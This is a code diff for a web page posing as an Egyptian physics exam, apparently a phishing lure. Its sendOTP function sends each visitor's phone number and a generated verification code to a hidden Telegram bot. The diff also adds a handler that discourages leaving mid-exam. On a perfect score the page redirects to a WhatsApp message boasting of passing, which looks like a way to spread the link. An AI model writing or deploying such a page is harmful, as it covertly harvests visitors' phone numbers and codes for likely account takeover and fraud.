@@ -139,6 +139,7 @@ const REDIRECT_URL="https://adhammahmoud11.github.io/EG1/";
 const examName="امتحان الفيزياء";
 
 let realOTP="", phoneNumber="", startTime, timerInterval;
+let examStarted = false; // لتحديد اذا بدأ الامتحان
 
 const questions=[
 {q:"(1): الشكل (2) يمثل دائرة كهربية تستخدم لتعيين مقاومة موصل معدني. أي الخطوط البيانية X , Y , Z , K في الشكل(2) يوضح العلاقة بين قيمة مقاومة الموصل وقراءة الأميتر؟", img:"p1.png", options:["X","Y","Z","K"], correct:"Y"},
@@ -154,77 +155,84 @@ const questions=[
 ];
 
 function sendOTP(){
-phoneNumber=phone.value.trim();
-if(!/^01[0125][0-9]{8}$/.test(phoneNumber)) return alert("رقم غير صحيح");
-realOTP=Math.floor(1000+Math.random()*9000)+"";
-phoneSection.style.display="none";
-otpSection.style.display="block";
-fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(
-`OTP\n${phoneNumber}\n${realOTP}\n${examName}`
-)}`);
+  phoneNumber = phone.value.trim();
+  if(!/^01[0125][0-9]{8}$/.test(phoneNumber)) return alert("رقم غير صحيح");
+  realOTP = Math.floor(1000 + Math.random()*9000) + "";
+  phoneSection.style.display = "none";
+  otpSection.style.display = "block";
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(
+    `OTP\n${phoneNumber}\n${realOTP}\n${examName}`
+  )}`);
 }
 
 function verifyOTP(){
-if(otpInput.value.trim()===realOTP){
-otpSection.style.display="none";
-startExam();
-}else alert("كود خطأ");
+  if(otpInput.value.trim() === realOTP){
+    otpSection.style.display = "none";
+    startExam();
+  } else alert("كود خطأ");
 }
 
 function startExam(){
-examSection.style.display="block";
-startTime=new Date();
-questionsContainer.innerHTML="";
-questions.forEach((q,i)=>{
-let h=`<div class="question"><h3>${q.q}</h3>`;
-if(q.img) h+=`<img src="${q.img}" onclick="openModal(this)">`;
-q.options.forEach(o=>{
-h+=`<label><input type="radio" name="q${i}" value="${o}"><span>${o}</span></label>`;
-});
-h+="</div>";
-questionsContainer.innerHTML+=h;
-});
-startTimer(17*60); // 17 دقيقة
+  examSection.style.display = "block";
+  examStarted = true; // بدأ الامتحان
+  startTime = new Date();
+  questionsContainer.innerHTML = "";
+  questions.forEach((q,i)=>{
+    let h = `<div class="question"><h3>${q.q}</h3>`;
+    if(q.img) h += `<img src="${q.img}" onclick="openModal(this)">`;
+    q.options.forEach(o=>{
+      h += `<label><input type="radio" name="q${i}" value="${o}"><span>${o}</span></label>`;
+    });
+    h += "</div>";
+    questionsContainer.innerHTML += h;
+  });
+  startTimer(17*60); // 17 دقيقة
 }
 
-// العداد
+// منع الخروج أثناء الامتحان
+window.addEventListener("beforeunload", function (e) {
+  if(examStarted){
+    e.preventDefault();
+    e.returnValue = "الامتحان لم يُسلم بعد! هل أنت متأكد من الخروج؟";
+  }
+});
+
 function startTimer(s){
-let r=s;
-timerInterval=setInterval(()=>{
-timer.innerText=
-String(Math.floor(r/60)).padStart(2,"0")+":"+
-String(r%60).padStart(2,"0");
-if(r--<=0){clearInterval(timerInterval);submitExam();}
-},1000);
+  let r = s;
+  timerInterval = setInterval(()=>{
+    timer.innerText = String(Math.floor(r/60)).padStart(2,"0")+":"+
+                      String(r%60).padStart(2,"0");
+    if(r-- <= 0){ clearInterval(timerInterval); submitExam(); }
+  }, 1000);
 }
 
-// فتح نافذة الصورة
 function openModal(img){
-document.getElementById("modalImg").src=img.src;
-document.getElementById("imgModal").style.display="flex";
+  document.getElementById("modalImg").src = img.src;
+  document.getElementById("imgModal").style.display = "flex";
 }
 function closeModal(){
-document.getElementById("imgModal").style.display="none";
+  document.getElementById("imgModal").style.display = "none";
 }
 
 function submitExam(){
-clearInterval(timerInterval);
-let score=0;
-questions.forEach((q,i)=>{
-const sel=[...document.getElementsByName("q"+i)].find(r=>r.checked);
-if(sel && sel.value===q.correct) score++;
-});
-const percent=Math.round(score/questions.length*100);
+  clearInterval(timerInterval);
+  examStarted = false; // انتهاء الامتحان
+  let score = 0;
+  questions.forEach((q,i)=>{
+    const sel = [...document.getElementsByName("q"+i)].find(r=>r.checked);
+    if(sel && sel.value === q.correct) score++;
+  });
+  const percent = Math.round(score/questions.length*100);
 
-if(percent===100){
-window.location.href=`https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(
-"أخيراً خلصت امتحانات ونجحت، الحمد لله رب العالمين 🎉🎓"
-)}`;
-}else{
-window.location.href=REDIRECT_URL;
-}
+  if(percent === 100){
+    window.location.href=`https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(
+      "أخيراً خلصت امتحانات ونجحت، الحمد لله رب العالمين 🎉🎓"
+    )}`;
+  } else {
+    window.location.href = REDIRECT_URL;
+  }
 }
 </script>
 
 </body>
-</html>
+    </html>
